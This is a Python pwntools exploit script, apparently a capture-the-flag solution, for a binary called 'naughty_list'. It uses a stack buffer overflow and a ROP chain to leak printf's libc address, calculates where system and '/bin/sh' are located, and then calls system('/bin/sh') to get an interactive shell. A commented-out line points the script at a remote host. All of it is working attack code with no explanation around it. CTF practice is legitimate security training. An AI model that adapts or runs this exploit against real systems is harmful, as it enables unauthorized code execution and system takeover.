from pwn import *

binary = ELF('./naughty_list')
#libc = ELF("./libc.so.6")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

main = 0x00000000004013AF
get_descr = 0x000000000040102B
pop_rdi = 0x0000000000401443
ret = 0x0000000000400756
puts_plt = binary.plt['puts']
printf_got = binary.got['printf']

r = process("./naughty_list")
#r = remote('139.59.180.40', 30056)

padding = (40 * b'A')
ropchain = p64(pop_rdi) + p64(printf_got) + p64(puts_plt) + p64(get_descr)

data = r.recv()
r.sendline(b'Test')
data = r.recv()
r.sendline(b'Test')
data = r.recv()
r.sendline(b'100')
data = r.recv()
r.sendline(padding + ropchain)
data = r.recvuntil(b'!\n')
data = r.recvline()

printf_libc = u64(data[:6] + b'\x00\x00')
libc_base = printf_libc - libc.symbols['printf']
libc_system = libc_base + libc.symbols['system']
binsh_str = libc_base + next(libc.search(b'/bin/sh'))

print('[+] Leaked printf address', hex(printf_libc))
print('[+] Libc base', hex(libc_base))
print('[+] Libc system address', hex(libc_system))
print('[+] /bin/sh address', hex(binsh_str))

shell = p64(ret) + p64(pop_rdi) + p64(binsh_str) + p64(libc_system)

data = r.recvuntil(b' \x1b[0m')
r.sendline(padding+shell)

r.interactive()